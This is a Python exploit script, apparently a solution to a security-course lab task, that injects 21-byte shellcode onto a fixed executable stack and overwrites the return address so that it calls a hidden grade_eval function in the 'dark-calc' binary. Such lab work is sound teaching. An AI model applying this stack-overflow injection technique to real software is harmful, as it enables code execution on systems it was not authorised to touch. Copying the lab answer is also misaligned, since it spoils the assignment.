#!/usr/bin/env python3
"""Task 2 — 栈空间执行 (stack code injection)  (binary: attack/dark-calc)

实验文档要求：把 shellcode 放到栈上，用溢出改写返回地址跳过去执行，
让 shellcode 调用“未被使用的” grade_eval 函数，输出
    Hope A will be your grade!

为什么栈可执行：dark-calc 在 __wrap_main 里用 init_fixed_stack() 通过
mmap(0x721000000000, len, PROT_READ|WRITE|EXEC, MAP_FIXED) 把栈换到一块
固定地址的 RWX 内存上。所以 (a) 栈可执行，(b) 缓冲区地址是定值、与 ASLR 无关。

shellcode (21B)：grade_eval 需要第一个参数在 edi 中（x86-64 调用约定）。
    mov  edi, 4            ; grade_eval(4)  -> 打印 Hope A
    mov  eax, 0x401a87     ; &grade_eval (non-PIE, 固定)
    call rax
    mov  eax, 0x3c         ; SYS_exit
    xor  edi, edi
    syscall                ; 干净退出

栈帧返回地址偏移 = 24。布局（总长 32B，远小于栈顶边界，安全）：
    [ shellcode 21B ][ pad 3B ][ ret = BUF (0x721000800fd0) ]

BUF 为缓冲区运行时地址，由固定栈 (MAP_FIXED @ 0x721000000000) 决定，ASLR 下仍稳定。
若换环境需重测：GDB 在 input 的 ret(0x4019d6) 断下，`printf "%p\\n", $rsp-24`。
已验证（ASLR 开启，多次稳定）：输出 "Hope A will be your grade!"。
"""
import sys, struct

BUF = 0x721000800fd0          # 固定可执行栈上的缓冲区地址

code  = bytes.fromhex("bf04000000")   # mov edi, 4
code += bytes.fromhex("b8871a4000")    # mov eax, 0x401a87 (grade_eval)
code += bytes.fromhex("ffd0")          # call rax
code += bytes.fromhex("b83c000000")    # mov eax, 0x3c (SYS_exit)
code += bytes.fromhex("31ff")          # xor edi, edi
code += bytes.fromhex("0f05")          # syscall
assert len(code) == 21

p  = code + b"\x90" * (24 - len(code))     # 垫到返回地址
p += struct.pack("<Q", BUF)                # 返回地址 -> shellcode 起点
assert b"\x0a" not in p

sys.stdout.buffer.write(p + b"\n")
